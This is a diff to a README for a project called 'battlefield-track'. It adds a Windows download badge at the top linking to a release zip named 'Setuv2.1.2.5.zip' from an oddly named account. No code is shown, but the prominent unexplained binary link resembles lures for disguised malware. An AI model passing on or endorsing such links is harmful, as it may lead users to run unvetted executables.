@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/download-windows--x64-0078D6?style=flat-square&logo=windows)](https://github.com/kevin-kingcode97y3/battlefield-track/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 battlefield-track
 
 ![License](https://img.shields.io/github/license/kevin-kingcode97y3/battlefield-track) ![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)
